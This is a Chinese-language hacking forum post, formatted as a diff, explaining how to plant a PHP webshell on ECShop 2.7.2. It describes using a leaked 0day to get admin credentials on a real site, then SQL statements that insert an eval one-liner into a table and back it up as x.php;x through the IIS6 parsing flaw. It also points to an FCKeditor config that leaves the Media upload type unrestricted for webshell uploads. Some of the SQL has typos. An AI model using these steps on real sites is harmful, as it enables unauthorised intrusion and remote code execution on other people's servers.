@@ -1,0 +1,21 @@
+天弄站遇到个ECSHOP2.7.2然后用前几天论坛里大牛发的那个0DAY得到了后台管理账户和密码，但是没有拿WEBSHELL的详细方法，然后我百度搜索了&quot;ECSHOP 2.7.2 WEBSHELL&quot;出来的基本都是说的2.6的拿WEBSHELL的方法，然后我就在网站后台里看看到数据备份和SQL执行语句，然后想起了通过执行SQL语句建表插入一句话然后备份成x.php;x通过II6解析漏洞的方法，第一次测试时直接用的默认的备份结果备份出来6个分卷文件还很大，打开半天貌似也没发现执行一句话，然后点了自定义备份结构发现里面没有插入的表，看着里面的表都是统一的前缀格式就猜想ECSHOP只调用了指定前缀的表，然后以这个前缀为新的表明前缀建立表，插入一句话，然后在自定义备份里面发现了这个表然后选中它直接备份成x.php;x名字就成功备份出来PHP一句话文件了，代码如下
+
+create tables ecs_shell(code text);/*
+insert into ecs_shell(code) valus('<?php eval($_post[cmd];?>');/*
+
+之后备份
+
+一句话地址  http://www.90sec.org/data/sqldata/cmd.php
+
+
+漏洞利用文件 http://target/includes/fckeditor/editor/filemanager/connectors/test.html
+我们看下 includes/fckeditor/editor/filemanager/connectors/php/config.php
+
+$Config['AllowedExtensions']['File'] = array('7z', 'aiff', 'asf', 'avi', 'bmp', 'csv', 'doc', 'fla', 'flv', 'gif', 'gz', 'gzip', 'jpeg', 'jpg', 'mid', 'mov', 'mp3', 'mp4', 'mpc', 'mpeg', 'mpg', 'ods', 'odt', 'pdf', 'png', 'ppt', 'pxd', 'qt', 'ram', 'rar', 'rm', 'rmi', 'rmvb', 'rtf', 'sdc', 'sitd', 'swf', 'sxc', 'sxw', 'tar', 'tgz', 'tif', 'tiff', 'txt', 'vsd', 'wav', 'wma', 'wmv', 'xls', 'xml', 'zip') ;   $Config['FileTypesPath']['File'] = $Config['UserFilesPath'] . 'File/' ;   $Config['FileTypesAbsolutePath']['File']= ($Config['UserFilesAbsolutePath'] == '') ? '' : $Config['UserFilesAbsolutePath'].'File/' ;   $Config['QuickUploadPath']['File'] = $Config['UserFilesPath'] . 'File/' ;   $Config['QuickUploadAbsolutePath']['File']= $Config['UserFilesAbsolutePath'] . 'File/' ;    //$Config['AllowedExtensions']['Image'] = array('bmp','gif','jpeg','jpg','png') ;   $Config['AllowedExtensions']['Image'] = array('jpg','gif','jpeg','png') ;   $Config['DeniedExtensions']['Image'] = array() ;   $Config['FileTypesPath']['Image'] = $Config['UserFilesPath'] . 'Image/' ;   $Config['FileTypesAbsolutePath']['Image']= ($Config['UserFilesAbsolutePath'] == '') ? '' : $Config['UserFilesAbsolutePath'].'Image/' ;   $Config['QuickUploadPath']['Image'] = $Config['UserFilesPath'] . 'Image/' ;   $Config['QuickUploadAbsolutePath']['Image']= $Config['UserFilesAbsolutePath'] . 'Image/' ;    //$Config['AllowedExtensions']['Flash'] = array('swf','flv') ;   $Config['AllowedExtensions']['Flash'] = array('swf','fla') ;   $Config['DeniedExtensions']['Flash'] = array() ;   $Config['FileTypesPath']['Flash'] = $Config['UserFilesPath'] . 'Flash/' ;   $Config['FileTypesAbsolutePath']['Flash']= ($Config['UserFilesAbsolutePath'] == '') ? '' : $Config['UserFilesAbsolutePath'].'Flash/' ;   $Config['QuickUploadPath']['Flash'] = $Config['UserFilesPath'] . 'Flash/' ;   $Config['QuickUploadAbsolutePath']['Flash']= $Config['UserFilesAbsolutePath'] . 'Flash/' ;    //$Config['AllowedExtensions']['Media'] = array('aiff', 'asf', 'avi', 'bmp', 'fla', 'flv', 'gif', 'jpeg', 'jpg', 'mid', 'mov', 'mp3', 'mp4', 'mpc', 'mpeg', 'mpg', 'png', 'qt', 'ram', 'rm', 'rmi', 'rmvb', 'swf', 'tif', 'tiff', 'wav', 'wma', 'wmv') ;   $Config['AllowedExtensions']['Media'] = array() ;   $Config['DeniedExtensions']['Media'] = array() ;   $Config['FileTypesPath']['Media'] = $Config['UserFilesPath'] . 'Media/' ;   $Config['FileTypesAbsolutePath']['Media']= ($Config['UserFilesAbsolutePath'] == '') ? '' : $Config['UserFilesAbsolutePath'].'Media/' ;   $Config['QuickUploadPath']['Media'] = $Config['UserFilesPath'] . 'Media/' ;   $Config['QuickUploadAbsolutePath']['Media']= $Config['UserFilesAbsolutePath'] . 'Media/' ;
+
+对Media 没有任何限制. 直接 Type=Media 上传 你的 webshell
+
+访问路径为 
+http://target/images/upload/Media/xxx.php
+
+
